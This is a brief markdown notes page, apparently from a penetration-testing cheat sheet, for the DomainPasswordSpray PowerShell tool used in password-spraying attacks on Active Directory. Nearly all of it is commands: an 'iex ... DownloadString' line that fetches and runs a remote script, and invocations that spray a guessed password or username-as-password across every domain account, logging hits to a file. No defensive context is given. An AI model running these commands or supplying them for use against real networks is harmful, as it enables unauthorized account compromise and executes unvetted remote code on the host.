---
title : "DomainPasswordSpray"
# pre : ' '
description : "Powershell script to perform password spray attack in Active Directory."
date : 2021-02-02T10:07:59+01:00
# hidden : true
# draft : true
weight : 80
# tags : ['']
---

## Installation

```plain
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/crypt0rr/DomainPasswordSpray/master/DomainPasswordSpray.ps1")
```

## Usage

```plain
Invoke-DomainPasswordSpray -Password Welkom01 -OutFile c:\temp\spray-results.txt
```

It can also be interesting to use the `-UsernameAsPassword` flag.

```plain
Invoke-DomainPasswordSpray -UsernameAsPassword -OutFile c:\temp\spray-results.txt
```

## URL List

- [Github.com - DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)
